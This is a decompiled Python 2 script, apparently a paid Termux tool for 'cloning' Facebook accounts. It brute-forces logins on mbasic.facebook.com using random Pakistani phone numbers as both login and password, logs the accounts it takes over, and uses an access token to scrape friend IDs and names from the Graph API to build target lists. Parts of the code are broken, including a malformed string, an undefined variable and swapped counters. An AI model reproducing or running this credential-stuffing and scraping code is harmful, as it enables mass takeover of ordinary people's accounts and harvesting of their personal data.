# DECOMPILED BY 4se1L
import os, time, requests, datetime, random,multiprocessing.pool, getpass, json, threading, sys, uuid, shutil, zlib, base64
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError


os.system("rm -rf .txt")
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
pass

l1="100078"
l2="100079"

g='\x1b[1;92m'
r='\x1b[1;91m'
w='\x1b[1;97m'
y='\x1b[1;93m'
n='\x1b[1;94m'
gu='\x1b[1;95m'
sm='\x1b[1;96m'

try:
    import lolcat
except:
    os.system('pip2 install lolcat')
logo = """'
\x1b[1;93m' ##::::::::::'###::::'##::::::::::'###::::
'\x1b[1;92m'##:::::::::'## ##::: ##:::::::::'## ##:::
'\x1b[1;91m'##::::::::'##:. ##:: ##::::::::'##:. ##::
'\x1b[1;93m'##:::::::'##:::. ##: ##:::::::'##:::. ##:
'\x1b[1;92m'##::::::: #########: ##::::::: #########:
'\x1b[1;91m'##::::::: ##.... ##: ##::::::: ##.... ##:
'\x1b[1;93m'########: ##:::: ##: ########: ##:::: ##:
'\x1b[1;92m'........::..:::::..::........::..:::::..::


'\x1b[1;91m' ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄
'\x1b[1;91m'   Author      ||    SUBHAN KHAN     
'\x1b[1;92m'   Github      ||     subhanXkhan  
'\x1b[1;93m'   FB ID       ||    Subhan Khan
'\x1b[1;94m'   TOOL TYPE   ||    PAID
'\x1b[1;96m'   WAP NUMBER  ||     03189339494            
'\x1b[1;91m' ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄
"""
dec="2"
server="2"


rsauser = ''Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]'
header= {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent":rsauser, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
reload(sys)
sys.setdefaultencoding('utf8')



fuck=[]
idx=[]
oks=[]
cps=[]


    
    
def main_apv():
    imt="+SUBHAN=="
    os.system('clear')
    print logo
    try:
        key1=open("/sdcard/subhan.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
        print ("           You dont have subscrption")
        print ("           Contact To Admin For You're Subscription")
        print ("")
        myid=uuid.uuid4().hex[:10]
        print ("         YOUR KEY : "+myid+imt)
        kok=open("/sdcard/Subhan.txt",'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
        print ("'\x1b[1;91m'           This Is Your Key 🗝️👆")
        print ("'\x1b[1;93m'           Copy The Key in Send Me on WhatsApp ")
        print ("")
        print ("")
        print ("")
        print('\x1b[1;92m'            If You Subscribe your Key 🗝️ !")
        raw_input("  then Exit The Termux And Put The Commond And run Again Thanks ❣️")
        os.system("xdg-open https://wa.me/+923189339494")
        
    r1=requests.get("https://raw.githubusercontent.com/SubhanXKhan/Paid/main/server.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
        print logo
        print ("\x1b[1;94m'           You dont have subscrption")
        print ("\x1b[1;94m'            Press Enter To Subscribe Your key 🗝️")
        print ("\x1b[1;94m'            And Contact Me On Whatsapp Thanks ")
        print ("")
        print ("         YOUR KEY : "+key1)
        print ("")
        print ("\x1b[1;94m'            This is Your key 🗝️ 👆")
        print ("\x1b[1;94m'            Copy Your Key 🗝️ And Send To The Admin On Whatsapp")
        print ("")
        print ("")
        print ("")
        print ("\x1b[1;94m'              If You Subscribe Your Key !")
        raw_input("  Then Exit the Termux Putt The Commond And Run Again")
        os.system("xdg-open https://wa.me/+923189339494")
        
        
        

def main_system():
    try:
        token=open('token.txt','r').read()
    except:
        pass
    try:
        r=requests.get('https://graph.facebook.com/me?access_token=' + token)
        q=json.loads(r.text)
        m=q['name']
        print ''
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print "Trun On Data An Then \t"
        print("")
    except:
        print ('\x1b[1;91mToken on Chekpiont ')
        os.system('rm -rf token.txt')
    os.system('clear')
    print logo
    print ""
    print 39*'~'
    print "\033[1;91m║--\033[1;91m> \033[1;93m1.\033[1;92m Public Cloning   \x1b[1;93m(Login)"
    print "\033[1;91m║--\033[1;91m> \033[1;9m2.\033[1;91m Random Cloning  \x1b[1;92m(No Login)"
    print "\033[1;94m║--\033[1;91m> \033[1;93m3.\033[1;93m File Making Menu\x1b[1;92m    (Login)"
    print "\033[1;94m║--\033[1;91m> \033[1;93m4.\033[1;91m Check Subscription "
    print "\033[1;94m║--\033[1;91m> \033[1;93m5.\033[1;92m Update Tools"
    print "\033[1;94m║--\033[1;91m> \033[1;93m6.\033[1;93m For Any Help Massage WhatsApp"
    print 43*'~'
    print "\x1b[1;92m[*] \x1b[1;91m For Need Any Help Type 7 And Massage Me On \x1b[1;92mWhatsApp "
    print 43*'~'
    main_input()
def main_input():
    mx=raw_input('\x1b[1;92m[!] Select : ')
    if mx=='1':
        print ""
        print('\033[1;91m Cheking Subscription ....\033[1;92m')
        time.sleep(3)
        fb_menu()
    elif mx=='2':
        print ""
        print('\033[1;91m Cheking Subscription ....\033[1;92m')
        time.sleep(3)
        numcloning()
    elif mx=='3':
        print ""
        os.system ('clear')
        print ("")
        print ("")
        print ("")
        print "        [ File Cloning ]"
        print ""
        print " [ cloning with pass or name + pass ]"
        print ""
        print "\033[1;94m║--\033[1;91m> \033[1;93m1.\033[1;92m With Choice Pass)"
        print "\033[1;94m║--\033[1;91m> \033[1;93m2.\033[1;91mCloning With Name + Pass)"
        print "\033[1;94m║--\033[1;91m> \033[1;93m3.\033[1;92m Cloning With Auto Pass"
        print "\033[1;94m║--\033[1;91m> \033[1;93m0.\033[1;95mBack"
        print ""
        c=raw_input("[!] Select : ")
        if c=='1':
            f_p_pass()
        elif c=='2':
            n_f_p_pass()
        elif c=="3":
            fileauto()
        else:
            main_system()
    elif mx=='4':
        print ""
        print('\033[1;94m Cheking Subscription ....\033[1;97m')
        time.sleep(3)
        grap()
    elif mx=='5':
    	os.system ('clear')
        print logo
        print ("")
        print ("")
        print ("")
        print ("")
        print ("        Congratulations Bro Your Pro")
        print ("        Member In Subhan Paid Commands ")
        print ("        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/SubhanXKhan/Paid")
        os.system("rm -rf Paid")
        os.system("cp -f Paid/Paid \\.")
        os.system("rm -rf Paid")
        time.sleep(5)
        xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
        time.sleep(2)
			
			
    elif mx=='7':
        os.system("xdg-open https://wa.me/+923189339494")
        time.sleep(3)
        main_system()
        
        
    else:
        print ('invild option')
        time.sleep(2)
        main_system()


def numcloning():
    if dec in server:
        pass
    else:
        notf()
    ra=[]
    cps=[]
    oks=[]
    os.system ("clear")
    print logo
    print ""
    print    "    \033[1;91m\n[ Pakistan Random Number Cloning ]"
    
    print ""
    print ('\033[1;92m\n   [*] Enter First 4 Latter Of Any Network : ')
    print ("\033[1;93m\n     Example 0300  0345 0320 0303 ")
    print ""
    coc=raw_input ('\033[1;95m\nChoice Code :\033[1;93m ')
    try:
        list = '.txt'
        for li in open(list, 'r').readlines():
            ra.append(li.strip())
    except (KeyError, IOError):
        print ("File Missing")
        time.sleep (2)
        main_system()
    print ("")
    print "\033[1;93m\n[*] Total Ids : " +str(len(ra))
    print ""
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    print "\033[1;93m CRACKING START PLEASE WAIT FOR IDS..   "
    print "\033[1;93m IF IDS NOT COMMING USE (airplane) FLIGHT MOD"
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    def main(arg):
        user = arg
        lines = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
			'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        try:
            pass1 = user
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': coc+user, 'pass': pass1, 'login': 'submit'})
            
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[SUBHAN-OK] "+coc+user + " | " + pass1
                ok=open('SUBHAN-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(cid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    
                    print "\x1b[1;92m[SUBHAN-OK] "+coc+user + " | " + pass1
                    cp=open('SUBHAN random-co.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(cid+pass1)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, ra)
    print "\x1b[1;91m"
    print 40*'-'
    print "[!] Cloning Complete Been Completed ........"
    print 40*'-'
    print '[!] Total Ok Ids : ' +str(len(cps))
    print '[!] Total Cp Ids : ' +str(len(oks))
    print "\033[1;93m BAAKI NAAM TO SONA HOGAA [SUBHAN])"
    print 40*'-'
    print ''
    raw_input(' Press Enter To Back ')
    main_system()
    

def fb_menu():
    if dec in server:
        pass
    else:
        notf()
        
    try:
        token=open('token.txt','r').read()
    except:
        os.system('clear')
        print logo
        print 39*'-'
        print "\033[1;92m\n[1] Login With Token"
        print "\033[1;93m\n[0] Back"
        print 39*'-'
        pp=raw_input('\033[1;94m\nSelect :\033[1;91m ')
        if pp=='1':
            os.system('clear')
            print logo
            print "\033[1;91m\n[*] Enter Your Token Hear"
            print ''
            tok=raw_input('\033[1;92m\n[*]PASTE TOKEN :\033[1;97m ')
            j=open('token.txt','w')
            j.write(tok)
            j.close()
            try:
                r=requests.get('https://graph.facebook.com/me?access_token=' + tok)
                q=json.loads(r.text)
                m=q['name']
                print ''
                print ('WELCOME : '+m)
                time.sleep(2)
                fb_menu()
            except requests.exceptions.ConnectionError:
                print logo
                print ''
                print "Trun On Data An Then \t"
                print("")
            except:
                os.system ('clear')
                print ""
                print ""
                print ('\033[1;91m     Your Token Is Expire')
                time.sleep(3)
                os.system('rm -rf token.txt')
                main_system()
        else:
            main_system()
    os.system('clear')
    os.system('rm -rf file.txt')
    os.system('rm -rf newlinks.txt')
    print logo
    print   ""
    print 39*'-'
    print "\033[1;97m║--\033[1;91m> \033[1;91m1.\033[1;92m Public Cloning  [Pro]"
    print "\033[1;97m║--\033[1;91m> \033[1;91m2.\033[1;92m Public Cloning  [Fast]"
    print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;91m Back "
    print 39*'-'
    cz=raw_input('[!] Select : ')
    if cz=="1":
        print ""
        print "\033[1;91m      [ Public Cloning Pro ]"
        print ""
        print " [\033[1;93m cloning with pass or name + pass ]"
        print ""
        print "\033[1;92m[1] Cloning with password"
        print "\033[1;92m[2] Cloning with name + pass"
        print "\033[1;91m[0] Back"
        print ""
        c=raw_input("[!] Select : ")
        if c=='1':
            p_p_pass()
        elif c=='2':
            n_p_pass()
        else:
            fb_menu()
    elif cz=="2":
        print ""
        print "\033[1;92m      [ Public Cloning Fast ]"
        print ""
        print "\033[1;92m [ cloning with pass or name + pass ]"
        print ""
        print "\033[1;92m[1] Cloning With Choice Password"
        print "\033[1;92m[2] Cloning With Name + Pass"
        print "\033[1;92m[3] Cloning With Auto Pass"
        print "\033[1;91m[0] Back"
        print ""
        vv=raw_input("\033[1;95m[!] Select :\033[1;92m ")
        if vv=="1":
            xokp()
        elif vv=="2":
            xoknp()
        elif vv=="3":
            xokpauto()
        else:
            fb_menu()
    elif cz=="v":
        os.system('clear')
        print logo
        print ""
        print ""
        print "\t     [ File Making ]"
        print ""
        print "\t  [ Maximum Limit 10 IDs ]"
        print ""
        c=raw_input("[!] How Many Links Do You Want To Dump : ")
        if c=='1':
            ext1()
        elif c=='2':
            ext2()
        elif c=='3':
            ext3()
        elif c=='4':
            ext4()
        elif c=='5':
            ext5()
        elif c=='6':
            ext6()
        elif c=='7':
            ext7()
        elif c=='8':
            ext8()
        elif c=='9':
            ext9()
        elif c=='10':
            ext10()
        else:
            fb_menu()
    elif cz=="4":
        mineExt()
    else:
        main_system()


def mineExt():
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        fb_menu()
    os.system('clear')
    print logo
    print ""
    iiid=raw_input("[=] Enter ID : ")
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ""
    print sm+"[=] Extracting From : "+nid+" > \x1b[1;91mFriends"
    print ""
    time.sleep(2)
    print gu+"[=] Graping URLs ......"+w
    print ""
    time.sleep(2)
    print g+"[=] Graping Complte Process Start *"+w
    print ""
    os.system(' cat look.txt | grep "10000" >> kk.txt')
    os.system(' cat look.txt | grep "1000" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN  : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ""
    print ""
    print sm+"[=] Total Extract ids : "+str(len(count))+w
    print ""
    mvt=raw_input("[=] Enter Path To Save File : ")
    print "[=] Your File Save in : "+mvt
    shutil.move(hok,mvt)
    os.system('rm -rf jok.txt')
    raw_input('[=] Press Enter To Back')
    fb_menu()





def xokpauto():
    os.system("rm -rf kk.txt")
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        fb_menu()
    os.system('clear')
    print logo
    print ""
    iiid=raw_input("[=] Enter ID : ")
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ""
    print sm+"[=] Transfer From : "+nid+" > \x1b[1;91mFriends"
    print ""
    time.sleep(2)
    print g+"[=] Transfer Complte Process Start *"+w
    print ""
    os.system(' cat look.txt | grep "10000" >> kk.txt')
    os.system(' cat look.txt | grep "1000" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
